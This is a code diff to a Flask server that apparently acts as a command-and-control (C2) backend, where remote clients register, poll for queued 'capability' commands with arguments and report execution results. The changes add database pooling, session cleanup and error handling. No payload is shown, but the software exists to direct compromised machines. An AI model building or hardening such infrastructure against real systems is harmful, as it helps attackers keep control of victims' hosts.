@@ -23,6 +23,12 @@ CORS(app)
 # Configure database
 app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'sqlite:///c2_server.db')
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
+    'pool_pre_ping': True,
+    'pool_recycle': 300,
+    'pool_size': 10,
+    'max_overflow': 20
+}
 
 # Initialize database
 init_db(app)
@@ -37,6 +43,14 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger(__name__)
+
+# Teardown function to properly close database sessions
+@app.teardown_appcontext
+def shutdown_session(exception=None):
+    """Remove database session at the end of the request"""
+    if exception:
+        db.session.rollback()
+    db.session.remove()
 
 # Capability IDs
 CAPABILITIES = {
@@ -63,35 +77,40 @@ def register():
         logger.warning("Registration attempt without client ID")
         return jsonify({"status": "error", "message": "Client ID required"}), 400
     
-    # Register or update client
-    client = Client.query.get(client_id)
-    if client:
-        # Update existing client
-        client.last_seen = datetime.utcnow()
-        client.ip = request.remote_addr
-        client.status = 'active'
-    else:
-        # Create new client
-        client = Client(
-            id=client_id,
-            ip=request.remote_addr,
-            status='active'
-        )
-        db.session.add(client)
+    try:
+        # Register or update client
+        client = Client.query.get(client_id)
+        if client:
+            # Update existing client
+            client.last_seen = datetime.utcnow()
+            client.ip = request.remote_addr
+            client.status = 'active'
+        else:
+            # Create new client
+            client = Client(
+                id=client_id,
+                ip=request.remote_addr,
+                status='active'
+            )
+            db.session.add(client)
+            
+            # Initialize command for this client
+            cmd = Command(client_id=client_id, capability=0, args='')
+            db.session.add(cmd)
         
-        # Initialize command for this client
-        cmd = Command(client_id=client_id, capability=0, args='')
-        db.session.add(cmd)
-    
-    db.session.commit()
-    
-    logger.info(f"[+] Client registered: {client_id} from {request.remote_addr}")
-    
-    return jsonify({
-        "status": "registered",
-        "id": client_id,
-        "message": "Client successfully registered"
-    }), 200
+        db.session.commit()
+        
+        logger.info(f"[+] Client registered: {client_id} from {request.remote_addr}")
+        
+        return jsonify({
+            "status": "registered",
+            "id": client_id,
+            "message": "Client successfully registered"
+        }), 200
+    except Exception as e:
+        logger.error(f"Error registering client: {str(e)}")
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 
 @app.route('/api/command', methods=['GET'])
@@ -106,27 +125,34 @@ def get_command():
         logger.warning("Command fetch attempt without client ID")
         return "0", 400
     
-    # Update last seen timestamp
-    client = Client.query.get(client_id)
-    if client:
-        client.last_seen = datetime.utcnow()
-        db.session.commit()
-    else:
-        logger.warning(f"Command request from unregistered client: {client_id}")
-        return "0", 404
-    
-    # Get pending command
-    cmd = Command.query.filter_by(client_id=client_id, executed=False).order_by(Command.created_at.desc()).first()
-    
-    if cmd and cmd.capability != 0:
-        logger.info(f"[*] Capability command sent to {client_id}: {cmd.capability} ({CAPABILITIES.get(cmd.capability, 'Unknown')}) with args: {cmd.args}")
-        # Mark command as executed
-        cmd.executed = True
-        db.session.commit()
-        return jsonify({"capability": cmd.capability, "args": cmd.args}), 200
-    else:
-        logger.debug(f"[*] No pending command for {client_id}")
-        return jsonify({"capability": 0, "args": ""}), 200
+    try:
+        # Update last seen timestamp
+        client = Client.query.get(client_id)
+        if client:
+            client.last_seen = datetime.utcnow()
+            db.session.commit()
+        else:
+            logger.warning(f"Command request from unregistered client: {client_id}")
+            db.session.rollback()
+            return "0", 404
+        
+        # Get pending command
+        cmd = Command.query.filter_by(client_id=client_id, executed=False).order_by(Command.created_at.desc()).first()
+        
+        if cmd and cmd.capability != 0:
+            logger.info(f"[*] Capability command sent to {client_id}: {cmd.capability} ({CAPABILITIES.get(cmd.capability, 'Unknown')}) with args: {cmd.args}")
+            # Mark command as executed
+            cmd.executed = True
+            db.session.commit()
+            return jsonify({"capability": cmd.capability, "args": cmd.args}), 200
+        else:
+            logger.debug(f"[*] No pending command for {client_id}")
+            db.session.commit()  # Close transaction
+            return jsonify({"capability": 0, "args": ""}), 200
+    except Exception as e:
+        logger.error(f"Error getting command: {str(e)}")
+        db.session.rollback()
+        return jsonify({"capability": 0, "args": ""}), 500
 
 
 @app.route('/api/report', methods=['POST'])
@@ -186,11 +212,17 @@ def list_clients():
     List all registered clients
     URL: GET /api/clients
     """
-    clients = Client.query.all()
-    return jsonify({
-        "count": len(clients),
-        "clients": {client.id: client.to_dict() for client in clients}
-    }), 200
+    try:
+        clients = Client.query.all()
+        db.session.commit()  # Ensure transaction is closed
+        return jsonify({
+            "count": len(clients),
+            "clients": {client.id: client.to_dict() for client in clients}
+        }), 200
+    except Exception as e:
+        logger.error(f"Error listing clients: {str(e)}")
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 
 @app.route('/api/results', methods=['GET'])
@@ -199,12 +231,18 @@ def list_results():
     List all execution results
     URL: GET /api/results
     """
-    limit = request.args.get('limit', 100, type=int)
-    results = Result.query.order_by(Result.timestamp.desc()).limit(limit if limit > 0 else None).all()
-    return jsonify({
-        "count": len(results),
-        "results": [r.to_dict() for r in results]
-    }), 200
+    try:
+        limit = request.args.get('limit', 100, type=int)
+        results = Result.query.order_by(Result.timestamp.desc()).limit(limit if limit > 0 else None).all()
+        db.session.commit()  # Ensure transaction is closed
+        return jsonify({
+            "count": len(results),
+            "results": [r.to_dict() for r in results]
+        }), 200
+    except Exception as e:
+        logger.error(f"Error listing results: {str(e)}")
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 
 @app.route('/api/send_command', methods=['POST'])
@@ -266,18 +304,25 @@ def get_client(client_id):
     Get details of a specific client
     URL: GET /api/client/<client_id>
     """
-    client = Client.query.get(client_id)
-    if not client:
-        return jsonify({"status": "error", "message": "Client not found"}), 404
-    
-    # Get pending command
-    pending_cmd = Command.query.filter_by(client_id=client_id, executed=False).order_by(Command.created_at.desc()).first()
-    
-    return jsonify({
-        "status": "success",
-        "client": client.to_dict(),
-        "pending_command": pending_cmd.to_dict() if pending_cmd else None
-    }), 200
+    try:
+        client = Client.query.get(client_id)
+        if not client:
+            db.session.rollback()
+            return jsonify({"status": "error", "message": "Client not found"}), 404
+        
+        # Get pending command
+        pending_cmd = Command.query.filter_by(client_id=client_id, executed=False).order_by(Command.created_at.desc()).first()
+        db.session.commit()  # Close transaction
+        
+        return jsonify({
+            "status": "success",
+            "client": client.to_dict(),
+            "pending_command": pending_cmd.to_dict() if pending_cmd else None
+        }), 200
+    except Exception as e:
+        logger.error(f"Error getting client: {str(e)}")
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 
 @app.route('/api/client/<client_id>/results', methods=['GET'])
@@ -286,17 +331,25 @@ def get_client_results(client_id):
     Get all results from a specific client
     URL: GET /api/client/<client_id>/results
     """
-    client = Client.query.get(client_id)
-    if not client:
-        return jsonify({"status": "error", "message": "Client not found"}), 404
-    
-    client_results = Result.query.filter_by(client_id=client_id).order_by(Result.timestamp.desc()).all()
-    return jsonify({
-        "status": "success",
-        "client_id": client_id,
-        "count": len(client_results),
-        "results": [r.to_dict() for r in client_results]
-    }), 200
+    try:
+        client = Client.query.get(client_id)
+        if not client:
+            db.session.rollback()
+            return jsonify({"status": "error", "message": "Client not found"}), 404
+        
+        client_results = Result.query.filter_by(client_id=client_id).order_by(Result.timestamp.desc()).all()
+        db.session.commit()  # Close transaction
+        
+        return jsonify({
+            "status": "success",
+            "client_id": client_id,
+            "count": len(client_results),
+            "results": [r.to_dict() for r in client_results]
+        }), 200
+    except Exception as e:
+        logger.error(f"Error getting client results: {str(e)}")
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 
 @app.route('/api/capabilities', methods=['GET'])
@@ -317,15 +370,25 @@ def health():
     Health check endpoint
     URL: GET /api/health
     """
-    clients_count = Client.query.count()
-    results_count = Result.query.count()
-    
-    return jsonify({
-        "status": "healthy",
-        "timestamp": datetime.utcnow().isoformat(),
-        "clients_count": clients_count,
-        "results_count": results_count
-    }), 200
+    try:
+        clients_count = Client.query.count()
+        results_count = Result.query.count()
+        db.session.commit()  # Close transaction
+        
+        return jsonify({
+            "status": "healthy",
+            "timestamp": datetime.utcnow().isoformat(),
+            "clients_count": clients_count,
+            "results_count": results_count
+        }), 200
+    except Exception as e:
+        logger.error(f"Error in health check: {str(e)}")
+        db.session.rollback()
+        return jsonify({
+            "status": "unhealthy",
+            "timestamp": datetime.utcnow().isoformat(),
+            "error": str(e)
+        }), 500
 
 
 @app.route('/', methods=['GET'])
